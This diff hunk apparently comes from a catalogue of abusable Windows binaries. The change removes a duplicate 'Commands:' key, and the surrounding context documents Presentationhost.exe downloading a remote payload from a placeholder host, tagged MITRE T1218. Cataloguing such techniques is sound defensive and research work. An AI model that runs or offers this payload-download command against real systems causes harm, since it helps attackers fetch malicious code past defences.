@@ -11,7 +11,6 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
-Commands:
   - Command: Presentationhost.exe https://example.com/payload
     Description: It will download a remote payload and place it in the cache folder (for example - %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE)
     Usecase: Downloads payload from remote server
